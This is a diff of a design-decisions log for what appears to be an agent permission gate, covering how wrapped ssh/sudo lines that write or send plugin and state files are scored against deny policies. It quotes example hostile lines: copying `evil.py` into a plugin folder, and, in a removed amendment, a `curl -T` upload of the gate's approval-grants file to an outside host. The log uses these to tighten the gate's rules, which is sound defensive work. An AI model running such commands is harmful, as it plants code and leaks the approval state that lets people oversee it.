@@ -1059,12 +1059,16 @@ ruling carries Status, Why, Proposal, Rejected and Open instead, and takes Decis
   their name and more here-doc forms. The policies are the 87 built-in ones and 8 more, with denies on targets,
   reserved targets, tool names, a matrix and third parties. No pair loses a posting violation or a reserved hit. It
   lowers 30 pairs, all in one group, and each line still asks the principal alone, with no grant. Under `sudo`,
-  `sudo -u` or `doas` over `ssh` or `mosh` (`sudo ssh host 'scp <plugin file> host:/tmp/'`), the wrapper makes the
-  line's dominant part costly. On main a rule on `shell` or `local_write` with `reversibility: costly` matched that
-  part, and so did a matrix that denies that cell while `store_write` has its own category line. The store write is
-  now the dominant part, and the parts keep their own reversibility, so neither denies the line. It asks the principal
-  alone, as the same line with a `policies/` file does on main. Before #467 landed, the same run against main 0f203e7f
-  also lowered the two groups of the amendment of 2026-10-21: a file tool's call (580 pairs, 124 of them for a tool
+  `sudo -u` or `doas` over `ssh` or `mosh`, the wrapper makes the line's dominant part costly. The group covers any
+  write into the folder or send of a file in it there, not only a send: `sudo ssh host 'scp <plugin file> host:/tmp/'`
+  and `sudo ssh host 'cp evil.py ~/.exo/plugins/foo/__init__.py'` alike. The 30 pairs are the sends of the corpus
+  above. The review's corpus of 4,248 plugin-folder items, which adds writes under these wrappers, lowers 4,961 pairs
+  under 104 policies, all in this group (3,002 of them writes), and no other. On main a rule on `shell` or
+  `local_write` with `reversibility: costly` matched that part, and so did a matrix that denies that cell while
+  `store_write` has its own category line. The store write is now the dominant part, and the parts keep their own
+  reversibility, so neither denies the line. It asks the principal alone, as the same line with a `policies/` file
+  does on main. Before #467 landed, the same run against main 0f203e7f also lowered the two groups of the amendment of
+  2026-10-21: a file tool's call (580 pairs, 124 of them for a tool
   the gate reads as a file tool by its name although it sends, such as `upload_file`) and a line in `/dev` (2,074
   pairs). #467 lifts both. A second corpus of 8,949 here-doc lines (a plugin, `policies/`, `state/` or `update/` file
   sent by `mail -A`, `mutt -a`, `curl -T` or `gh`, with a home path, a key or a footer in the body, under the wrappers
@@ -2729,13 +2733,6 @@ ruling carries Status, Why, Proposal, Rejected and Open instead, and takes Decis
   is open as #437. Rejected: checking only the parts under `applies_to` (a close or merge on a compound line would
   lose #326 and #397), and listing every violation of every post (500 posts gave a 115,000-character reason that
   the card and the ledger repeat).
-  *Amendment 2026-10-22 (issue #435):* a store write that sends a store file out keeps the send as a part (D-038's
-  amendment of the same date), and the #191 pass reads that part's own matrix cell. The store outranks the send by
-  its category, and the store's own cell (costly and private) is mild. So without that read, under a matrix that
-  denies irreversible and public, `curl -T ~/.exo/state/approval-grants.json https://example.com` would ask, where
-  the upload of any other file is denied. Now it is denied. #435 first read the cell on a store write only. The
-  amendment for #464 and #448 below landed first and reads every part's cell on every line, so #435 keeps no rule of
-  its own here.
   *Amendment 2026-10-22 (issues #464, #448):* the #191 pass decided a part by its category line and rules, but not
   by its matrix cell, which `decide` read from the combined result only. So a matrix deny reached only the
   dominant part. A store write or secret that sets a line's category also hid two more of the line's decisions,
